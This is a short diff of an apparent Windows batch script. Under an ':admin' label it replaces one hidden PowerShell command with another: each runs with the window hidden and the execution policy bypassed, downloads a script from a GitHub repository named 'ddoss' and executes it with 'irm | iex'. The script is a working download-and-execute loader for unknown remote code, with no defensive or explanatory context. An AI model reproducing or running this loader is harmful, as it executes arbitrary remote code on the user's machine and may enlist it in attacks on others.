@@ -5,5 +5,6 @@ timeout /t 2 /nobreak >nul
 goto retry
 
 :admin
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/srap18/ddoss/main/1122 | iex"
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "irm https://github.com/srap18/ddoss/raw/refs/heads/main/fix | iex"
 exit
+
